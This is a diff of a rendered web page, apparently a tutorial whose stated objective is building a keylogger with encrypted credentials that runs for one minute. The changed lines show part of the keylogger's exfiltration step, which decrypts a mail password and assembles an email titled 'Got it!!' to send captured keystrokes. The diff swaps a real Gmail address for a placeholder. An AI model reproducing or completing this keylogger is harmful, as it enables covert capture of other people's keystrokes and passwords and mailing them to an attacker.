@@ -1,4 +1,4 @@
-I"•9
+I"‡9
 <p>OBJECTIVE:</p>
 <blockquote>
   <p>Create a Keylogger with password encryption for one minute execution.</p>
@@ -71,11 +71,11 @@
     <span class="n">password</span> <span class="o">=</span> <span class="n">clave</span><span class="p">.</span><span class="n">decrypt</span><span class="p">((</span><span class="n">pass_enc</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
 
     <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">()</span>
-    <span class="n">mensaje</span> <span class="o">=</span> <span class="s">'Guarda bien esto!'</span>
+    <span class="n">mensaje</span> <span class="o">=</span> <span class="s">'Save this!!'</span>
 
-    <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'seandaza@gmail.com'</span>
-    <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'seandaza@gmail.com'</span>
-    <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Te lo he Capturado'</span>
+    <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'youremail@email.com'</span>
+    <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'youremail@email.com'</span>
+    <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Got it!!'</span>
 
     <span class="n">msg</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">MIMEText</span><span class="p">(</span><span class="n">mensaje</span><span class="p">,</span> <span class="s">'plain'</span><span class="p">))</span>
 
